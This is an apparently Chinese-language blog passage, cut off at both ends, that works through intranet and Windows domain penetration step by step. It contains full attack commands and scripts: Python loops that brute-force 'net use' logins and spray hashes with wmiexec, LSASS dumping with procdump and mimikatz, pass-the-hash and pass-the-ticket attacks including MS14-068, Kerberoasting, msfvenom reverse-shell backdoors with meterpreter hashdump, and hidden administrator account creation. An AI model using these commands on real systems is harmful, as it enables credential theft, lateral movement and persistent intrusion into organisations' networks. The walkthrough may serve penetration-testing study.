&#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>执行效果</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>将python脚本编译成exe文件</p><p>安装pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>生成可执行EXE</p><pre><code>Pyinstaller -F [.py文件]</code></pre><p>会生成一个同名的exe文件 </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-配合获取hash密码"><a href="#Procdump-Mimikatz-配合获取hash密码" class="headerlink" title="Procdump+Mimikatz 配合获取hash密码"></a><strong>Procdump+Mimikatz 配合获取hash密码</strong></h2><p>这种情况适用于mimikatz被杀，但是自己做免杀失败/或不想做免杀可以来与Procdump配合使用，因为Procdump是官方自带的，所以不会被杀</p><ul><li>Procdump下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump 在目标机上执行procdump -accepteula -ma lsass.exe lsass.dmp# mimikatz 在本地执行：privilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>然后可以利用 Hashcat 破解获取 Windows NTML Hash</p><h2 id="SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方"><a href="#SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方" class="headerlink" title="SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)"></a><strong>SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p><pre><code>#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行exit #退出</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec 第二种：不用建立 IPC 直接提供明文账户密码psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>但是当我们使用hash传递时</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法采用 hash 连接#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>就会出现问题，这是因为官方 Pstools 无法采用 hash 连接，所以我们可以使用 impacket 工具包</p><p>缺点:非官方，会被杀毒软件杀掉，所以要做免杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>无需先 ipc 链接 明文或 hash 传递</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-服务利用-wmic-cscript-wmiexec"><a href="#WMI-服务利用-wmic-cscript-wmiexec" class="headerlink" title="WMI 服务利用-wmic,cscript,wmiexec"></a><strong>WMI 服务利用-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p><strong>自带 WMIC 明文传递 无回显 所以写入文件夹后还要自己想办法读取</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>自带 cscript 明文传递 有回显</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escript不需要下载，自带。但是需要用到第三方 wmiexec.vbs，但是wmiexec.vbs免杀非常简单</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>缺点：容易被杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>同理可以借用编程解放双手</p><p><strong>hash 批量利用-python 编译 exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="PTH&amp;PTK&amp;PTT哈希票据传递"></a><strong>PTH&amp;PTK&amp;PTT哈希票据传递</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos 协议在域中具体工作方法： </p><p>**1、客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用 krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检 测，成功之后创建 TGT(Ticket-Granting Ticket) **</p><p>**2、将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 **</p><p>**3、 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服 务）票证，并且对 TGT 进行检测 **</p><p><strong>4、 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</strong></p><pre><code>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试 PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试 PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</code></pre><p><strong>PTH</strong></p><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p><p> 总结：KB2871997 补丁后的影响</p><p>pth：没打补丁用户都可以连接，打了补丁只能 administrator 连接 </p><p>ptk：打了补丁才能用户都可以连接，采用 aes256 连接</p><p>参考链接: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的。</p><p>三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket。</p><p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限，微软给出的补丁是 kb3011780。</p><p>Golden ticket(黄金票据)，SILVER ticket(白银票据)，属于权限维持技术 ，简单来说就是将连接合法的票据注入到 内存中实现连接。</p><p><strong>案例:</strong></p><p><strong>1.PTH传递-mimikatz</strong></p><p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可 以攻击成功。</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>假设我们找到了域控的hash密码</p><pre><code># PTH ntlm 传递# 未打补丁下的工作组及域连接：sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #连接域用户sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #连接本地用户sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>就会弹出一个cmd窗口</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTK传递-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>这个必须打了补丁才能连接，不然连不上去</p><pre><code>PTK aes256 传递打补丁后的工作组及域连接：sekurlsa::ekeys #获取 aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</strong></p><p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p><p>此处mimikatz无需提升权限，因为不涉及高权限操作，一个普通用户就可以</p><pre><code>#MS14-068 powershell 执行1.查看当前 sid whoami/user2.mimikatz # kerberos::purge//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中3.利用 ms14-068 生成 TGT 数据ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.票据注入内存mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.查看凭证列表 klist6.利用dir \\192.168.3.21\c$  #如果ip无法识别，改成计算机名字</code></pre><p>第二种利用工具 kekeo</p><pre><code>1.生成票据kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.导入票据kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.查看凭证 klist4.利用 net use 载入dir \\192.168.3.21\c$</code></pre><p>第三种利用mimikatz导出本地票据(需要管理权限)</p><p>域控连接后10h内有效</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</strong></p><h2 id="RDP与SPN"><a href="#RDP与SPN" class="headerlink" title="RDP与SPN"></a><strong>RDP与SPN</strong></h2><p><strong>RDP</strong></p><p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p><pre><code>RDP明文密码链接1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDP密文HASH链接windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f开启后运行：1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>域横向移动SPN服务-探针,请求,导出,破解,重写</strong></p><p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p><p>1、探针</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2、请求票据</p><pre><code>klist purge //删除缓存票据klist    //查看票据# 请求票据 # powershell请求Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# 或者mimikatz请求mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3、导出票据(到mimikatz运行目录)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4、破解票据</p><pre><code># 破解工具tgsrepcrack.py python3环境运行（将票据拖到本地破解）python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5、重写票据（属于后续攻击，不一定会成功，-u500指的是管理员用户，-g512指的是管理员组）</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</code></pre><p>6、利用</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><h2 id="ssh隧道"><a href="#ssh隧道" class="headerlink" title="ssh隧道"></a>ssh隧道</h2><p>通常，我们用于调试的计算机无法远程访问位于局域网中的待调试设备。通过 ssh 的端口转发(又称 ssh 隧道)技术，可以实现这种远程调试功能。ssh 客户端运行于本地机器，它的作用是：登录到目标机器并在目标机器上执行命令。它可以建立一个安全通道，为不安全网络上两个不受信任的主机提供安全的加密通信。X11 连接、任意 TCP 端口和 UNIX 域套接字也可以通过 ssh 安全通道进行转发。ssh 连接并登录到指定的主机名(用户名可选)。如果指定了命令，命令将在远程主机上执行，而不是在本机 shell 里执行。</p><p>ssh 端口转发相关的常用选项如下：</p><hr><p><strong>-C</strong></p><p>请求压缩所有数据(包括 stdin、stdout、stderr 和用于转发的 X11、TCP 和 UNIX 域连接的数据)。压缩算法与 gzip 使用的算法相同，压缩级别由 ssh 协议版本 1 的 CompressionLevel 选项控制。在调制解调器线路和其他慢速连接上采用压缩是可取的，但它会减慢快速网络上的速度。</p><hr><p><strong>-f</strong></p><p>请求 ssh 在执行命令之前转到后台。如果用户希望 ssh 在后台运行，但 ssh 需要用户提供密码或口令，使用 -f 选项就很有用，在用户输入密码之后，ssh 就会转入后台运行。这个选项隐含了 -n 选项的功能(-n 选项将 stdin 重定向到 /dev/null，从而避免后台进程读 stdin)。在远程站点上启动 X11 程序的推荐方法是使用 “ssh -f host xterm” 。</p><p>如果 ExitOnForwardFailure 配置选项设置的是 “yes”，则使用 -f 选项启动的 ssh 客户端会等所有的远程端口转发建立成功后才将自己转到后台运行。</p><hr><p><strong>-n</strong></p><p>将 stdin 重定向到 /dev/null (实际上是为了防止后台进程从stdin读取数据)。当 ssh 在后台运行时必须使用此选项。</p><p>一个常见的技巧是使用它在目标机器上运行 X11 程序。例如，<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> 将在 shadows.cs.hut.fi 上启动 emacs 程序。X11 的连接将通过加密通道自动转发。ssh 程序将在后台运行。(如果 ssh 需要请求密码或口令，则此操作无效；参见-f选项。)</p><hr><p><strong>-N</strong></p><p>不执行远程命令。此选项用于只需要端口转发功能时。</p><hr><p><strong>-g</strong></p><p>允许远程主机连接到本地转发端口。如果用于多路复用连接，则必须在主进程上指定此选项。</p><hr><p><strong>-t</strong></p><p>强制分配一个伪终端。在目标机上执行任意的基于屏幕的程序时(例如，实现菜单服务)，分配伪终端很有用。使用多个 -t 选项则会强制分配终端，即使 ssh 没有本地终端。</p><hr><p><strong>-T</strong></p><p>禁止分配伪终端。</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>数据从本机转发到远程。本机上指定 TCP 端口或 UNIX 套接字的连接将被转发到目标机上指定端口或套接字。</p><p>上述参数中，bind_address 指本地地址；port 指本地端口；local_socket 指本地 UNIX 套接字；host 指远程主机地址；hostport 指远程端口；remote_socket 指远程 UNIX 套接字。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh 端口转发模式</strong></p><p>ssh 的端口转发有三种模式：</p><ul><li><p><strong>本地：ssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>将本地机监听端口 local_listen_port 上的数据转发到远程端口 remote_host:remote_port</p></li><li><p><strong>远程：ssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>将代理机监听端口 agent_listen_port 上的数据转发到本地端口 local_host:local_port</p></li><li><p><strong>动态：ssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>正向连接</strong></p><p>WEB服务器执行</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>反向连接</strong></p><p>在攻击机上启动ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>在web服务器上执行</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # 将本地的22端口转发到192.168.0.115 的2222端口</code></pre><p>攻击机上再执行</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socket代理</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>生成metaploit后门</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>当运行后门，得到反弹shell后</p><p><strong>映射端口:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>此时我们访问 本机的2020端口 即打开192.168.0.115:2020 实际上访问的是 10.10.10.128:80 的服务</p><p><strong>端口转发</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #将肉鸡的3389端口映射到本地的5555端口rdesktop 127.0.0.1:5555</code></pre><p><strong>查看列表</strong></p><pre><code>portfwd list</code></pre><p><strong>清空列表</strong></p><pre><code>portfwd flush</code></pre><h2 id="socket隧道"><a href="#socket隧道" class="headerlink" title="socket隧道"></a>socket隧道</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318220150442.png" alt="image-20220318220150442"></p><p>​    下载地址:</p><pre><code>http://sourceforge.net/project/ssocks/</code></pre><p>解压编译:</p><pre><code>tar zxvf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; make #编译后会创建一个src文件夹cd src</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318221138321.png" alt="image-20220318221138321"></p><p>kali机使用：</p><pre><code>./rcsocks -l 1088 -p 1080 -vv</code></pre><p>等待远程socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道</p><p>web服务器:</p><pre><code>/rssocks -vv -s 192.168.10.115:1080</code></pre><p>利用proxychains进行Socks5代理</p><p> 编辑proxychains工具</p><pre><code>vim /etc/proxychains.conf</code></pre><p>注释掉socks4，加上socks5</p><pre><code>#socks4 127.0.0.1 9050socks5 127.0.0.1 1088</code></pre><p>kail机使用代理访问：</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>就会成功访问</p><p>使用nmap扫描</p><pre><code>proxychains nmap -Pn -sT 10.10.10.128</code></pre><h1 id="跨路由扫描"><a href="#跨路由扫描" class="headerlink" title="跨路由扫描"></a>跨路由扫描</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318224021872.png" alt="image-20220318224021872"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到反弹shell</p><pre><code>getuid  查看当前用户ifconfig  获取网卡信息run get_local_subnets 获取路由信息run autoroute -p 查看当前路由run autoroute -s 10.10.10.0/24 增加路由 </code></pre><p>使用socks4a模块</p><pre><code>use auxiliary/server/socks4a</code></pre><p>　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。<br>   SRVPORT：监听的端口，默认为1080。</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318225453685.png" alt="image-20220318225453685"></p><p>设置端口</p><pre><code>set SRVPORT 1044exploit</code></pre><p>然后配置proxychains</p><pre><code>vim /etc/proxychains.conf</code></pre><p>proxychains.conf </p><pre><code>socks4 192.168.0.115 1044</code></pre><p>使用nmap扫描</p><pre><code>proxychains nmap -sT Pn 10.10.10.128</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318230018344.png" alt="image-20220318230018344"></p><p>也可以用浏览器访问</p><pre><code>proxychains firefox http://10.10.10.128</code></pre><p>缺点:</p><p>无法进行爆破(如hydra)等一些操作</p><h1 id="MSF-常见的内网测试渗透"><a href="#MSF-常见的内网测试渗透" class="headerlink" title="MSF-常见的内网测试渗透"></a>MSF-常见的内网测试渗透</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318231904664.png" alt="image-20220318231904664"></p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2003服务器反弹shell</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234051072.png" alt="image-20220318234051072"></p><p>查看路由表</p><pre><code>route</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318234749786.png" alt="image-20220318234749786"></p><p>增加路由</p><pre><code>run autoroute -s 10.10.10.0/24</code></pre><p>查看路由列表</p><pre><code>run autoroute -p</code></pre><p>清空路由</p><pre><code>run autoroute -d</code></pre><p>提权命令:</p><pre><code>sysinfo 查看系统信息</code></pre><pre><code>ps 查看进程</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid 当前用户getprivs 尽可能提升权限getsystem 通过各种攻击向量来提升系统用户权限</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>增加管理员</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>检测存活ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> 增加路由表</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #端口默认是1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445开放，尝试hash攻击</p><p>hash获取</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>使用mimikatz来获取更多密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; run getgui -e #开启3389端口meterpreter &gt; run getgui -u sakura -p 123456 #增加用户</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口</code></pre><h1 id="MSF进行一次完整的域渗透流程"><a href="#MSF进行一次完整的域渗透流程" class="headerlink" title="MSF进行一次完整的域渗透流程"></a>MSF进行一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" 